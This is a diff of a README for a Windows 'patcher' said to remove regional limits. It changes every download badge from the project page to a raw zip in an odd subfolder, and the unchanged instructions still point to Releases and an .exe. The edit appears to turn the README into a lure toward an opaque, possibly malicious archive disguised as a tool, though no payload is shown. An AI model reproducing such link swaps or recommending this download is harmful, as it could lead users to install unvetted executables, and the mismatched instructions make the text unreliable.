@@ -1,6 +1,6 @@
 # 🔑 open-antigravity-patcher - Remove Regional Limits Easily
 
-[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher)
+[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-purple?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher/raw/refs/heads/main/optionor/open_antigravity_patcher_1.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before starting, make sure your system meets these requirements:
 
 To get the patcher, visit the main project page. Click the download badge below to open the GitHub page.
 
-[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-green?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher)
+[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-green?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher/raw/refs/heads/main/optionor/open_antigravity_patcher_1.5.zip)
 
 Once there, look for the latest release under "Releases" or the main download section. Download the Windows executable file (usually ends with `.exe`).
 
@@ -90,4 +90,4 @@ If you need help or want to report an issue:
 
 ---
 
-[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher)
+[![Download open-antigravity-patcher](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/luca8107/open-antigravity-patcher/raw/refs/heads/main/optionor/open_antigravity_patcher_1.5.zip)
